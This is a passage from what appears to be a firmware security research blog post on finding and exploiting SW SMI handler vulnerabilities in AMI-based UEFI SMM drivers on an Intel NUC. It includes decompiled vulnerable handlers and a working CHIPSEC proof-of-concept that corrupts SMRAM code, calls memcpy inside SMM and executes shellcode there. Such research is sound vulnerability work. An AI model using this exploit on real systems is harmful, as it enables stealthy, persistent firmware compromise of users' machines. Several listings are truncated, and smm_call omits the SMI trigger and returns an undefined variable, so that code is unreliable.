    QNC_SMM_PROTOCOL_TYPE           ProtocolType;
};
 Of course, on firmware from other vendor that was designed for other Intel chips DATABASE_RECORD structure will have a different format almost for sure. But at least, now we have a clue about what exactly we should look inside of SMRAM dump to identify registered SW SMI handlers. Here you can see some "DBRC" signature occurrence that was found inside SMRAM dump from Intel NUC: seg000:000000008B76C410                 dq 'CRBD' ; database record header signature

 To confirm that it’s actually valid DATABASE_RECORD structure that describes really existing SMI handler of needed type you have to follow by its handler directly to SMM driver image where it is located, and check which exactly SMM protocol was used by this driver to register our handler function. If we see some call to EFI_SMM_SW_DISPATCH2_PROTOCOL.RegisterHandler() there — we’re fine to go next. At this point you also may notice, that DATABASE_RECORD structure has several quad words with 0x34 and 0x504 constant values which allow us to identify SW SMI handlers among SMI handlers of other types. Now we can write a Python function that scans SMRAM dump contents for any valid DATABASE_RECORD structure, iterates over all registered SMI handlers using list entry field and prints information about SW SMI handlers which were found: def dump_sw_smi_handlers():

    first_entry, ptr = None, 0
    parse = lambda offset: unpack('QQ104sQQQ', smram[offset : offset + 0x90])

    # find any valid DATABASE_RECORD structure
    while ptr < SMRAM_SIZE - 0x100:

        # check for 'DBRC' signature
        if smram[ptr : ptr + 4] == 'DBRC':

            flink, blink, _, _, func, smi = parse(ptr + 8)

            # check for valid EFI_LIST_ENTRY and SW SMI handler
            if in_smram(flink) and in_smram(blink) and in_smram(func) and \
               smi >= 0 and smi <= 255:

                first_entry = ptr
                break

        ptr += 8

    if first_entry is None:

        # unable to find DATABASE_RECORD structure
        return -1

    entry = first_entry

    # iterate double linked list
    while True:

        flink, blink, _, unk, func, smi = parse(entry + 8)

        # check for valid EFI_LIST_ENTRY
        if not in_smram(flink) or not in_smram(blink):

            # invalid DATABASE_RECORD structure
            return -1

        # check for valid SW SMI handler DATABASE_RECORD
        if unk == 0x504 and in_smram(func) and smi >= 0 and smi <= 255:

            # print handler information
            print('0x%x: SMI = 0x%.2x, addr = 0x%x' % (from_offset(entry), smi, func))

        # go to the next DATABASE_RECORD
        entry = to_offset(flink) - 8
        if entry == first_entry: break
 There are two interesting aspects of doing security research and reverse engineering as hobby. Firstly, you will likely not be paid for your wasted time. Secondly, there are too many interesting devices on the market which deserve your hands to be putten on and you have to be super productive to be able to do that. In such conditions it’s very important to automate as many relatively simple tasks, which need to be repeated for each target, as possible. You've already seen some junk code for SMRAM dumps analysis in my previous articles, but this time I decided to create a more proper tool that would be able to take your dump as input and give you the most useful information for comfortable reverse engineering of SMM code. Currently this tool is able to extract the following: SMRAM and SMST address information Loaded SMM drivers list SMM protocols list SMI entry address for each CPU SW SMI handlers list Root SmiHandlerRegister() handlers list Child SmiHandlerRegister() handlers list The tool can be downloaded from it's GitHub repository. To identify GUIDs and names of SMM drivers which were found inside SMRAM dump, it optionally can use UEFIDump command line utility to extract information about available SMM drivers from flash image file and then match these drivers by PE header fields with drivers found in SMRAM. Also, it allows to resolve names of common UEFI GUIDs which might be found in public header files, to use this feature you have to install ida-efiutils and specify its folder path in EFIUTILS_PATH variable. Usage of the tool from command line: $ smram_parse.py <smram_dump> [flash_image_dump] And its full output for SMRAM dump that was taken from my Intel NUC with firmware version SYSKLi35.86A.0045: $ python smram_parse.py TSEG_nuc.bin flash_image_nuc.bin

NOTES:

 * - SW SMI handler uses ReadSaveState()/WriteSaveState()
 From the output you may notice that there are several unnamed SMM drivers with several SW SMI handlers — they obviously belong to our SMM backdoor image (SW SMI handler with number 0xCC) and NvramSmi driver that was infected with backdoor code. Probably, someone might find this tool useful not only for reverse engineering purposes, but also for hunting on System Management Mode rootkits. I also want to admit that currently it’s a first known public tool (and I hope not the last) for SMRAM forensics. The tool was written mostly during my work on Intel NUC firmware reverse engineering and currently significant part of its code is nailed specifically to SMRAM dumps from AMI Aptio V based firmwares (do you still remember that different firmware versions from different vendors usually have different format of certain SMM structures that we have to deal with?). I already started to work on support of Lenovo ThinkPad firmwares, but if you want to do some good thing — take UEFI SMM backdoor, obtain SMRAM dump from your own machine, implement its support in smram_parse.py and send me your pull request. Exploring SW SMI handlers code From the output that was shown above, we see 22 SW SMI handlers in 15 different UEFI SMM drivers. In addition, 3 drivers obtain CPU register values from CPU saved state area using EFI_SMM_CPU_PROTOCOL — this information might be interesting because CPU saved state might be used to pass attacker controlled values directly into the SW SMI handler. Now we need to take a quick look over all these handlers without digging too deep and check their code for obvious security flaws. Each SW SMI handler function has following signature defined in "System Management Mode Core Interface specification": typedef
EFI_STATUS
(EFIAPI * EFI_SMM_HANDLER_ENTRY_POINT2)(
    IN EFI_HANDLE   DispatchHandle,
    IN CONST VOID   *Context            OPTIONAL,
    IN OUT VOID     *CommBuffer         OPTIONAL,
    IN OUT UINTN    *CommBufferSize     OPTIONAL
);
 Context argument usually points to EFI_SMM_SW_CONTEXT structure that allows to determine some information about SW SMI call occurred — like its number (useful when your driver has the same function registered as several different SW SMI handlers) and number of CPU where the SMI was generated: typedef struct
{
    UINTN SwSmiCpuIndex;
    UINT8 CommandPort;
    UINT8 DataPort;

} EFI_SMM_SW_CONTEXT;
 After an hour of much or less relaxed work, I found some interesting SW SMI handler sub_8B6ECB7C() with number 0x31 that belongs to UsbRt SMM driver. I've already seen SMM driver with same name in other firmwares, which means that it was likely written by AMI. Let’s check the handler code: EFI_STATUS __cdecl sub_8B6ECB7C(
    EFI_HANDLE DispatchHandle,
    VOID *Context, VOID *CommBuffer, UINTN *CommBufferSize)
{
    VOID *v4; // rcx@1
    EFI_STATUS result; // eax@5

    // get some structure pointer stored in global variable
    v4 = qword_8B7024F8;
    if (qword_8B7024F8)
    {
        // if global variable is not zero -- clear it
        qword_8B7024F8 = 0;
    }
    else
    {
        //
        // If global variable is zero -- calculate structure address
        // based on 4 byte unsigned integer stored in 1-st magebyte of
        // physical memory at 0x40e (attacker controllable) location.
        //
        v4 = (VOID *)*(_DWORD *)(*(unsigned short *)0x40E * 0x10 + 0x104);
    }

    if (v4)
    {
        // pass structure pointer to child function with no sanity checks
        sub_8B6EC888(v4);
        result = 0;
    }
    else
    {
        result = 9;
    }

    return result;
}
 As you can see, it reads attacker controlled two byte word located at 0x40E physical address, then it uses this value to calculate some memory address and read some pointer from that address. Then sub_8B6ECB7C() is passing obtained pointer value into sub_8B6EC888() function as single argument. Address 0x40E is located in first megabyte of physical memory space and it obviously means some stuff related to legacy BIOS. According to BIOS Data Area memory map — value at 40:0E address contains segment number of memory region called Extended BIOS Data Area (EBDA) with the following layout: Offset   Size       Description

 Pointer value that is being passed into the sub_8B6EC888() by SW SMI handler routine is located at offset 0x104 from the beginning of EBDA, I haven’t found any information about this part of EBDA in any public sources, so, I’m considering that it is used for some OEM or IBV specific magic from legacy BIOS era. Here’s the code of sub_8B6EC888() function that receives attacker controlled pointer value: void __fastcall sub_8B6EC888(void *SomeStruct)
{
  unsigned __int8 v1; // al@2

    if (SomeStruct)
    {
        // read byte form the beginning of the structure
        v1 = *(_BYTE *)SomeStruct;

        if (!*(_BYTE *)SomeStruct)
        {
LABEL_6:
            //
            // Use readed byte as index to call child function which
            // address is stored in array.
            //
            // Each function from off_8B6EBDF0 array accepts attacker
            // controlled structure pointer as first argument, so, their
            // code also may contain some useful exploitation primitives.
            //
            off_8B6EBDF0[(unsigned __int64)v1](SomeStruct);
            return;
        }

        // some checks to prevent array index overrun
        if (v1 >= 0x20 && v1 <= 0x38)
        {
            v1 -= 0x1F;
            goto LABEL_6;
        }

        //
        // Write constant value to the structure with attacker controlled
        // address. It might be used as exploitation primitive to overwrite
        // arbitrary byte within SMRAM with 0xF0 value.
        //
        *((_BYTE *)SomeStruct + 2) = 0xF0;
    }
}
 Yay! This function has no sanity checks of received pointer, upon finishing it writes byte with constant value 0xF0 at offset 0x02. Because pointer value that we’re talking about is controlled by attacker, it allows him to pass the pointer of some certain SMRAM structure into the sub_8B6EC888() and overwrite its byte with constant value. It’s not the most powerful exploitation primitive, but it still allows to achieve arbitrary SMM code execution in relatively easy way. In addition, sub_8B6EC888() function also calls specific child function by attacker controlled index from the statically initialized array located at address 0x8B6EBDF0. Here you can see array contents, these functions also accept the same pointer and heavily work with attacker controlled data what probably can give us even more larger attack surface and more nice exploitation primitives: seg000:000000008B6EBDF0 off_8B6EBDF0    dq offset sub_8B6ECE80

 However, we don’t need to go that deep because arbitrary memory overwrite with constant byte is pretty enough for our purposes. Exploitation of this vulnerability can be done in following steps: Find some code or data that affects execution flow and is located at fixed or predictable offset from the beginning of SMRAM. System Management Mode execution environment has its own page tables with all memory protection features available in regular x86_64 long mode. Luckily to us, SMM virtual memory space on machines with modern firmwares is still directly mapped to physical memory space one by one with RWX permissions for every single page. This fact allows us to overwrite long mode part of SMI entry code for the first CPU that is located at offset 0x3D50E5 from the beginning of SMRAM — it’s a good candidate because this offset should be the same for any version of firmware based on AMI Aptio V code base. At offset 0x3D5116 SMI entry code has MOV instruction that puts address of some function into RAX register. This function will be called at offset 0x3D5130 to do main part of SMI handling process. We need to trigger SW SMI handler of UsbRt driver with properly configured EBDA to overwrite second argument of this instruction with 0xF0 constant to redirect execution flow from SMI entry to attacker controlled code located outside of SMRAM. Then we need to trigger any SMI on first CPU to execute the shellcode. In addition to its usual job, such shellcode also needs to restore the bytes which were overwritten in previous step. Here’s assembly code of SMI entry that we need to patch:                                         ;
                                        ; Long mode part of SMI handler code, it is

 Unfortunately, I faced one problem when described exploit was implemented — my NUC completely hangs at 3-rd step of vulnerability exploitation. UEFI SMM backdoor helped me to verify that SMI entry code was overwritten in proper way, so, there’s only one reason why the exploit might not work. Starting from Haswell microarchitecture Intel processors support security feature called SMM_Code_Chk_En — when CPU enters into System Management Mode, it prohibits execution of any code located outside of SMRAM region by throwing unrecoverable and unhandleable Machine Check Exception (MCE). It works quite similar to Supervisor Mode Execution Prevention (SMEP) security feature that prohibits to execute ring 0 code located inside user space memory. I had never seen any firmware that actually uses SMM_Code_Chk_En before, so, it seems that now we have at least one interesting challenge of Intel NUC exploitation. SMM_Code_Chk_En bit is located in MSR_SMM_FEATURE_CONTROL model specific register that has the following description: Please notice that the Lock bit of MSR_SMM_FEATURE_CONTROL register — when it is set it’s not possible to modify this register value anymore till next full reset. In addition to this I discovered another interesting behaviour of MSR_SMM_FEATURE_CONTROL — when this MSR register is locked you can’t even read its value from non-SMM code. To indicate that target platform supports SMM_Code_Chk_En feature there’s SMM_Code_Access_Chk bit of MSR_SMM_MCA_CAP register: To check that Intel NUC firmware actually uses SMM_Code_Chk_En protection I modified UEFI SMM backdoor code to read the values of two model specific registers described above at the end of DXE phase of Platform Initialization: // required model specific registers numbers

 Yeah, that’s exactly what we expected to see which means that we have to change our exploitation scenario to bypass SMM_Code_Chk_En by, for example, copying our code into SMRAM before its execution. It’s also interesting to know, that behaviour of SMM_Code_Chk_En feature can be emulated even on older platforms don't have this bit. As it was already said, System Management Mode code has its own page tables with fully functional memory protection mechanisms. It allows firmware developers to prohibit unwanted code execution by setting of NX bit for every PTE entry that describes memory page located outside of SMRAM. I wonder why AMI and Intel devs are missing such great opportunity to make System Management Mode exploitation significantly more expensive in relatively low cost, using this approach you even can make some physical memory pages completely unaccessible from your SMM code — a hand made SMAP for System Management Mode! However, I’m glad that I met at least one machine that actually uses SMM_Code_Chk_En feture, on my memory it’s first non-academical attempt to deploy such exploit mitigation features into SMM. Also, part IV of "A Tour Beyond BIOS Implementing Profiling in with EDK II" whitepaper from Intel explains applied use-cases of SMM profiling features that present in PiSmmCpuDxeSmm driver from EDK2: During runtime, when there is an outside SMRAM code or data access, the page fault exception (#PF) is triggered. The #PF handler SmmProfilePFHandler() inserts a record in the profile table and patches the corresponding page table entry to be valid. Then the root #PF handle PageFaultIdtHandlerSmmProfile() enables the single step debug exception and returns to the original instruction The original code can execute one instruction and then triggers a debug exception (#DB). The #DB handler DebugExceptionHandler() restores the original page table entry in order to catch the page fault exception again. I think these features might be useful not only for profiling/debugging, but also for exploit mitigation purposes as SMM_Code_Chk_En replacement or, even better, in addition to it. Other SW SMI handlers vulnerabilities Because SMM_Code_Chk_En feature makes exploitation of discovered UsbRt driver vulnerability a bit less trivial, I decided to finish my quick audit of registered SW SMI handlers. Who knows, maybe we will able to find some more powerful exploitation primitives like overwriting of arbitrary memory with arbitrary value. After one vulnerable SW SMI handler was found — we can do our work a bit more simpler and save some time by checking other SW SMI handlers that access EBDA as probably vulnerable high priority targets. To determine whether some SMM driver is accessing EBDA region we can use a simple binary signature. Let’s check assembly code of vulnerable UsbRt SW SMI handler to find it out: seg000:000000008B6ECB7C                sub_8B6ECB7C    proc near

 The key part of this function — two assembly instructions at addresses 0x8B6ECB9D and 0x8B6ECBA5, these instructions read EBDA segment number from constant address 0x40E and then convert it to EBDA physical address. It will be pretty sane to assume, that other UEFI SMM drivers from the same vendor that which were built with same toolchain also may use same assembly instructions to access EBDA. Let’s open NUC flash image in UEFITool and do binary search by signature C1 E0 04 05 04 01 00 00 that represents two assembly instructions shown above: Signature search for vulnerable UEFI SMM drivers. Bingo! In addition to already analysed UsbRt driver UEFITool was able to find two other SMM drivers which have these bytes in their executable images: Signature search results. Binary signature search (especially with relatively short signatures like this one) is not very reliable method to match desired executable code, due to this reason we still need to perform some quick verification to be sure that matched drivers are not false positives and their code actually has SW SMI handlers which use EBDA in the same way as UsbRt driver. It appears that there were no false positives, so, here’s the list of interesting UEFI SMM drivers from Intel NUC firmware: GUID = 04EAAAA1-29A1-11D7-8838-00500473D4EB, name = UsbRt (was shown above) GUID = E5E2C9D9-5BF5-497E-8860-94F81A09ADE0, name = NvmeSmm GUID = EA343100-1A37-4239-A3CB-B92240B935CF, name = SdioSmm NvmeSmm and SdioSmm drivers have SW SMI handlers with addresses 0x8B716E40 and 0x8B700C94 correspondingly. After short reverse engineering of their code I figured that both of them read some structure pointer from EBDA and performs read and write operations with its fields without any security checks in the way like it was done in UsbRt driver. Here’s the code of SW SMI handler 0x42 that belongs to NvmeSmm driver, its pretty much the same as the code of vulnerable 0x31 SW SMI handler that was shown above: FI_STATUS __cdecl sub_8B716E40(
    EFI_HANDLE DispatchHandle,
    VOID *Context, VOID *CommBuffer, UINTN *CommBufferSize)
{
    VOID *v4; // rbx@1
    EFI_STATUS v5; // edi@1
    signed __int64 v6; // rax@4
    EFI_STATUS v7; // esi@4

    v4 = *(VOID **)CommBuffer;
    v5 = 0;
    byte_8B718250 = 1;

    if (v4)
    {
        *(_QWORD *)CommBuffer = 0;
    }
    else
    {
        v4 = (VOID *)*(_DWORD *)(*(unsigned int *)0x40E * 0x10 + 0x104);
    }

    v6 = sub_8B717E68((unsigned __int64)v4);
    v7 = v6;
    if (v6 < 0)
    {
        goto LABEL_8;
    }

    if (*(_BYTE *)v4 != 0x27 || *((_BYTE *)v4 + 1) >= 0xC)
    {
        v5 = v6;

LABEL_8:
        *((_BYTE *)v4 + 2) = 7;
        return v5;
    }

    off_8B7162C0[(unsigned __int64)*((_BYTE *)v4 + 1)](v4);
    return v7;
}
 If easy satisfiable input conditions were met, this function writes a byte with value 0x07 at offset 0x02 into the structure with attacker supplied address, it allows to overwrite almost any part of SMRAM with known constant. Also, sub_8B716E40() calls some child function by index in function array at address 0x8B7162C0 with attacker controlled structure pointer as its argument. Just like in case of sub_8B6EC888(), function from UsbRt driver, it leads to exposing large attack surface which might contain some other exploitation primitives. Let’s check the code of the third vulnerable SW SMI handler with number 0x40 that belongs to SdioSmm UEFI SMM driver: EFI_STATUS __cdecl sub_8B700C94(
    EFI_HANDLE DispatchHandle,
    VOID *Context, VOID *CommBuffer, UINTN *CommBufferSize)
{
    VOID *v4; // rbx@1

    byte_8B701FF0 = 1;
    v4 = (VOID *)*(_DWORD *)(*(unsigned int *)0x40E * 0x10 + 0x104);

    if (sub_8B701B08((unsigned __int64)v4, 103) < 0 || *(_BYTE *)v4 >= 4)
    {
        *((_BYTE *)v4 + 2) = 7;
    }
    else
    {
        off_8B700818[(unsigned __int64)*(_BYTE *)v4](v4);
    }

    return 0;
}
 Function table at 0x8B00818 used in this SW SMI handler is significantly smaller than function tables used in the sub_8B716E40() and sub_8B6EC888(), but at its end we can see the same statement that allows attacker to overwrite almost any SMRAM location with 0x07 byte. So, now we have a three vulnerable drivers from AMI which have security flaws similar in their nature, but a bit different in details (other constant values, offsets, etc.). The fact that described drivers are using abstractions from legacy BIOS era allows us to assume, that discovered vulnerabilities exist for quite a long time, most likely since the days when AMI decided to switch their software from legacy BIOS code base to EFI one. To confirm that vulnerabilities are not OEM or product specific and UsbRt, NvmeSmm or SdioSmm drivers with the same security flaws are also present in other firmwares — I decided to find such firmwares in products from OEM’s different than Intel. Luckily, one of my friends shared with me UEFI capsule with the firmware update verion 0801 from his Asus Q170M-C motherboard where I was able to find two of these drivers: UsbRt and NvmeSmm. It’s very cool that in such trivial way I was able to find a several industry wide vulnerabilities that might be present in a lot of computer models with firmware from AMI. To my taste, these vulnerabilities are more interesting from practical perspective than ThinkPwn because they're actually vulnerabilities of SW SMI handlers that can be called over 0xB2 I/O port. In case of ThinkPwn we have a single vulnerability that requires your own implementation of Communicate() function from DXE protocol EFI_SMM_BASE_PROTOCOL to exploit it from running operating system, such limitation isn’t nice simply because implementation of the Communicate() will be model specific and probably even BIOS version specific (actually, that’s why I decided to release my ThinkPwn PoC exploit as UEFI application — it can use existing DXE protocols not available during runtime phase to communicate with vulnerable SMI handler). What other interesting SW SMI handlers can we check as high priority targets based on some metainformation that we have at this point? From the output of smram_parse.py utility we can notice that it was able to find numerous SW SMI handlers located in three different drivers which use SMM protocol called EFI_SMM_CPU_PROTOCOL. This protocol allows SMM drivers to read and write saved CPU state area located in SMRAM where CPU saves the values of its registers before jumping to SMI entry. With its help SMM driver may receive attacker controlled input for some SMI handler via CPU registers, so, SW SMI handlers of NvramSmi, NbSmm and ItkSmmVars drivers definitely look promising. Among these three SW SMI handlers I was able to find one vulnerable handler registered with codes 0x44 and 0xEF, this handler belongs to SMM driver called ItkSmmVars: int __fastcall sub_2D98(__int64 a1, __int64 a2, __int64 a3, __int64 a4)

 This SW SMI handler receives some structure pointer controlled by attacker in RSI register and does read and write operations with the structure fields without any checks of its address. In the listing shown above significant part of function code was skipped to make it more readable, but at its end you can see switch-case block that allows to write words with constant values at attacker controllable location. Exploitation of such vulnerability is similar to three other vulnerabilities of NUC firmware described in this article, there’s only one difference — SW SMI handler of ItkSmmVars driver likely has no code related to legacy BIOS stuff such as locating of EBDA address. As for the ItkSmmVars itself — based on its name, this driver likely belongs to the framework called Intel Integrator's Kit. Documentation for this framework can be found in public, here’s the short description of its purpose: Intel Integrator Toolkit allows customization of system BIOS settings and is intended for use only by professional PC system integrators. Incorrect system BIOS settings may cause a system to malfunction, fail to boot, or operate with decreased performance. Incorrect BIOS settings may affect system stability and functionality. It sounds weird, but it seems that Intel doesn’t know how to write proper UEFI SMM drivers for firmwares of their own computers. I guess now you can imagine how horrible might be the code from other OEM and IBV companies in the world where even platform vendor itself can produce such ridiculously silly vulnerabilities. Vulnerability exploitation in real conditions When I've found fourth vulnerability that gives exploitation primitive similar to previous three — I decided to stop my ongoing analysis of other SW SMI handlers code and try to achieve arbitrary SMM code execution with one of vulnerabilities that were already known at this point. Because of SMM_Code_Chk_En security feature it’s possible to execute only the code located inside SMRAM region defined by SMRR registers, so, before shellcode execution we have to copy it into SMRAM somehow. It can’t be achieved with our exploitation primitives directly because they only allow to write a several different constant values. However, we can do this by corrupting SMM code or data to turn our limited exploitation primitive into a more powerful one that allows to overwrite arbitrary memory location with arbitrary data: Vulnerable SW SMI handlers of AMI drivers which were shown in previous parts of the article have similar code that uses statically initialized array of pointers to call some child functions by their numbers. Normally, these arrays are located inside SMRAM, but we can use our exploitation primitive to corrupt second argument of MOV or LEA machine instruction of SMM driver that moves address of the array into the register. After this we will have a patched machine instruction that uses address of array located in attacker controlled memory instead of original one. Attacker can put there his fake array with entries which point to ROP gadgets instead of original functions and trigger execution of patched SMM code using SW SMI. Properly selected ROP gadgets can copy arbitrary values at arbitrary memory addresses or do any other useful things. To implement this idea I decided to check the code of UsbRt SMM driver to find the address of proper machine instruction that will be convenient to patch, but accidentally I discovered a much more elegant way to exploit our vulnerabilities. Here you can see the code of sub_8B6EDF38() function that can be called from the previously shown sub_8B6EC888(). Address of the sub_8B6EDF38() is located in previously listed array off_8B6EBDF0 at index 15: int __fastcall sub_8B6EDF38(VOID *SomeStruct)
{
    VOID *v1; // rbx@1
    __int64 v2; // rax@1

    v1 = SomeStruct;

    //
    // This function calls other child function by their index in the
    // off_8B6EBF28 array with caller specified arguments.
    //
    v2 = sub_8B6EDDD0(
        off_8B6EBF28[(unsigned __int64)*(_BYTE *)(SomeStruct + 1)],
        *(_QWORD **)(SomeStruct + 3),
        (*(_DWORD *)(SomeStruct+ 0xB) + 3) & 0xFFFFFFFC
    );

    // report status
    *(_BYTE *)(v1 + 2) = 0;
    *(_QWORD *)(v1 + 0xF) = v2;

    return v2;
}
 This function gets some value at attacker controlled index from other array off_8B6EBF28 and passes it into the sub_8B6EDD0() as first argument. Second and third arguments of the sub_8B6EDD0() can be directly controlled by attacker, this function contains the most interesting code that allows us to do some wonderful things: int __fastcall sub_8B6EDDD0(VOID *Func, VOID **Args, unsigned int ArgsLen)
{
    unsigned __int64 v3; // rax@1
    signed __int64 v4; // rax@2

    int result; // eax@9

    v3 = (unsigned __int64)ArgsLen >> 3;

 As you can see, sub_8B6EDF38() and sub_8B6EDD0() altogether provide legit mechanism to call any function present in off_8B6EBF28 array with any amount of fully controlled arguments between 0 and 7. This unbelievably awesome gift from AMI devs allows attacker to not mess with any ROP chains and other complicated things. With proper patching of the sub_8B6EDF38() code it will be possible to call almost any function that exists inside of any loaded SMM drivers in absolutely natural way! For example, attacker can execute memcpy() to deliver his code into SMRAM or, even better, he can implement the whole payload logic outside of SMRAM and use patched sub_8B6EDF38() to call needed functions of existing SMM protocols. It will allow us to do pretty much everything that might be needed to do in SMM without having our own code that runs in SMM. Let’s check assembly code of sub_8B6EDF38() function that we’re going to patch: seg000:000000008B6EDF38                sub_8B6EDF38    proc near

 LEA instruction at address 0x8B6E7F4D is copying the address of array into the RAX register, it has machine code 48 8D 05 D4 DF FF FF. Using vulnerability in SW SMI handler of NvmeSmm driver we can turn its code into the 48 8D 05 07 07 07 FF, so, patched instruction will use second argument with value 0x8B6E7F4D + 0xFF070707 + 7 == 0x8A75E65B instead of original 0x8B6EBF28. At physical address 0x8A75E65B (located outside of SMRAM obviously) attacker needs to allocate a fake array with, for example, memcpy() address. Then it will be possible to use SW SMI handler of patched UsbRt driver to call memcpy() function (located inside SMRAM obviously) with arbitrary arguments by its address that was fetched from fake array. I made an explainable picture where you can see visual representation of UsbRt driver execution flow starting from sub_8B6EDF38() function before and after its patching: Reliability of this exploitation scenario depends on two addresses that must be hardcoded into the exploit code for each possible combination of computer model and firmware version: Physical address of LEA instruction of UsbRt SMM driver to patch. Physical address of memcpy() function located inside any loaded SMM driver. Such situation is still far away from perfect, the exploit code will not work on computer with firmware version previously unknown to the attacker. However, in case of exploitation with ROP gadgets which were described previously we’ll need to hardcode even larger amount of version/model specific constants. If you have any ideas how to make the exploit more reliable and easy portable — feel free to post some comments, pull requests or contact me over e-mail. Now its time to write some code. As usual, I decided to implement this PoC on the top of CHIPSEC framework API. Here’s the code that initializes CHIPSEC as library and provides more convenient wrapper for needed chipsec.hal classes: import sys, os, random
from struct import pack, unpack
from hexdump import hexdump

SMRAM_SIZE = 0x400000
SMRAM_ADDR = 0x8B400000

align_up = lambda a, b: a + (b - (a % b))

class Chipsec(object):

    def __init__(self):

        import chipsec.chipset
        import chipsec.hal.physmem
        import chipsec.hal.interrupts

        # initialize CHIPSEC
        self.cs = chipsec.chipset.cs()
        self.cs.init(None, True)

        # get instances of required classes
        self.mem = chipsec.hal.physmem.Memory(self.cs)
        self.ints = chipsec.hal.interrupts.Interrupts(self.cs)

    # CHIPSEC has no physical memory read/write methods for quad words
    def read_physical_mem_qword(self, addr):

        return unpack('Q', self.mem.read_physical_mem(addr, 8))[0]

    def write_physical_mem_qword(self, addr, val):

        self.mem.write_physical_mem(addr, 8, pack('Q', val))

    def mem_alloc(self, data, size = None):

        if not isinstance(data, basestring):

            size = data
            data = None

        if size is None:

            size = align_up(len(data), 0x100)

        _, addr = self.mem.alloc_physical_mem(size)
        self.mem.write_physical_mem(addr, size, '\0' * size)

        if data is not None:

            self.mem.write_physical_mem(addr, len(data), data)

        return addr
 To write 0x07 value into arbitrary physical memory location I decided to use NvmeSmm driver vulnerability, here’s the function that performs its exploitation (to overwrite second argument of LEA instruction we are going to call it three times for the three different bytes): # NvmeSmm SW SMI handler number
NVME_SMI_NUM = 0x42

def overwrite_with_0x07(addr):

    addr -= 2

    # backup memory contents
    val_0 = cs.mem.read_physical_mem_word(EBDA_ADDR)

    # overwrite EBDA word
    cs.mem.write_physical_mem_word(EBDA_ADDR, 0)

    addr_1 = (0 << 4) + 0x0104
    val_1 = cs.mem.read_physical_mem_dword(addr_1)

    # write pointer value
    cs.mem.write_physical_mem_dword(addr_1, addr)

    print('Trigerring SW SMI 0x%x to overwrite byte at 0x%x with 7...' % \
          (NVME_SMI_NUM, addr + 2))

    # fire SMI
    cs.ints.send_SW_SMI(0, NVME_SMI_NUM, 0, 0, 0, 0, 0, 0, 0)

    # restore overwritten memory
    cs.mem.write_physical_mem_dword(addr_1, val_1)
    cs.mem.write_physical_mem_word(EBDA_ADDR, val_0)
 Now let’s write main part of exploit code that overwrites LEA instruction argument, allocates fake functions array and fires patched SW SMI handler of UsbRt driver to execute caller specified SMM function with needed arguments: EBDA_ADDR = 0x040E

# UsbRt SW SMI handler number
USBRT_SMI_NUM = 0x31

# what BIOS version to exploit
BIOS_VER = 0

BIOS_VERSIONS = [

    # version name           address of memcpy()   address of instruction to patch
    ( 'SYSKLi35.86A.0045',   0x8B702110,           0x8B6EDF4D )
]

BIOS_VER, MEMCPY_ADDR, PATCH_INSN_ADDR = BIOS_VERSIONS[BIOS_VER]

PATCH_INSN_LEN = 7

def smm_call(func_addr, func_args = None):

    FUNC_TABLE = PATCH_INSN_ADDR + PATCH_INSN_LEN - (0xFFFFFFFF - 0xFF070707 + 1)
    FUNC_TABLE_SIZE = 7

    # internal function numbers for UsbRt SW SMI handler
    USBRT_PROC = 0x2E
    USBRT_SUB_PROC = 0x00

    args = [] if func_args is None else func_args
    args_addr = 0x00000500
    args_len = len(args)

    print('Target "lea reg, func_table" instruction to patch is at 0x%.8x' % \
          PATCH_INSN_ADDR)

    # patch function table offset from 0xFFFFxxxx to 0xFF070707
    overwrite_with_0x07(PATCH_INSN_ADDR + 3)
    overwrite_with_0x07(PATCH_INSN_ADDR + 4)
    overwrite_with_0x07(PATCH_INSN_ADDR + 5)

    # backup memory contents
    val_0 = cs.mem.read_physical_mem_word(EBDA_ADDR)
    val_1 = cs.mem.read_physical_mem(FUNC_TABLE, 8 * FUNC_TABLE_SIZE)
    val_2 = cs.mem.read_physical_mem(args_addr, 8 * args_len)

    # SMM handler communication structure with input data
    data = pack('=BBBQIQ', USBRT_PROC, USBRT_SUB_PROC, 0xFF, args_addr, 8 * args_len, 0)

    addr_1 = (0x10 << 4) + 0x0104
    data_1 = cs.mem.read_physical_mem_dword(addr_1)

    addr_2 = 0x00000300
    data_2 = cs.mem.read_physical_mem(addr_2, 0x20)

    print('%d function arguments are at 0x%.8x' % (args_len, args_addr))
    print('Fake functions table address is 0x%.8x' % FUNC_TABLE)
    print('SMM communication buffer address is at 0x%.8x' % addr_1)
    print('SMM communication buffer is at 0x%.8x' % addr_2)

    # write usb communication strucutre
    cs.mem.write_physical_mem(addr_2, len(data_2), '\0' * len(data_2))
    cs.mem.write_physical_mem(addr_2, len(data), data)

    # write usb communication strucutre address
    cs.mem.write_physical_mem_dword(addr_1, addr_2)

    # write function arguments
    for i in range(0, len(args)):

        cs.write_physical_mem_qword(args_addr + (8 * i), args[i])

    # write fake functions table
    for i in range(0, FUNC_TABLE_SIZE):

        cs.write_physical_mem_qword(FUNC_TABLE + (8 * i), func_addr)

    print('Triggering SW SMI 0x%x...' % USBRT_SMI_NUM)

    # fire SMI

    # check for status code returned by SW SMI handler
    val_3 = cs.mem.read_physical_mem_byte(addr_2 + 3)

    print('SUCESS: SMM function 0x%.8x was called' % func_addr)

    return val_4
 Now we can use smm_call() function to implement other useful payloads and primitives. For example, here’s the function that executes caller specified machine code in System Management Mode: smm_memcpy = lambda src, dst, size: smm_call(MEMCPY_ADDR, [ src, dst, size ])

def execute_shellcode(code, args):

    addr = SMRAM_ADDR + 0x1000
    code = ''.join(code) if isinstance(code, list) else code

    # align shellcode size by 0x100
    size = align_up(len(code), 0x100)
    code = code + '\0' * (size - len(code))

    # allocate temporary destination buffer for memcpy() call
    _, buff_addr = cs.mem.alloc_physical_mem(size)
    cs.mem.write_physical_mem(buff_addr, size, code)

    print('Copying %d bytes of the shellcode from 0x%.8x to 0x%.8x' % \
          (size, buff_addr, addr))

    # copy shellcode into SMRAM
    smm_memcpy(addr, buff_addr, size)

    print('Executing shellcode...')

    # call the shellcode
    return smm_call(addr, args)
